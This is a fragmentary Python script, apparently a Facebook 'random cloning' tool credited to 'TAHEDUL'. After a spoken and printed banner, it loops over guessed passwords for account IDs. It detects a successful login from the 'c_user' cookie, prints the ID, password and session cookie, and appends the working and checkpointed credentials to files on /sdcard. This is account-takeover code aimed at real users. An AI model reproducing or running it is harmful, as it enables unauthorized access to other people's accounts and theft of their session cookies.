...
os.system('espeak -a 300 " WELCOME TO MY NEW TOOLS"')
...
logo =("""
 ...
 ↬↬↬↬↬↬↬↬↬↬↬↬↬↬↬↬↬↬↬↬↬↬↬↬↬↬                                                          
 \033[1;32m¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥
\033[1;32m  AUTHOR    : TAHEDUL
\033[1;32m  GITHUB    : ︎︎︎︎︎︎TAHEDUL
\033[1;32m  FACEBOOK  : ƬƛӇЄƊƲԼ ヽ・　T.T
\033[1;32m  TOOL NAME : RANDOM CLONING
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐎𝐊💚] ' +uid+ ' | ' +ps+    '  \n[‎‎💥]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/𝐓𝐀𝐇𝐄𝐃𝐔𝐋-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/𝐓𝐀𝐇𝐄𝐃𝐔𝐋-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
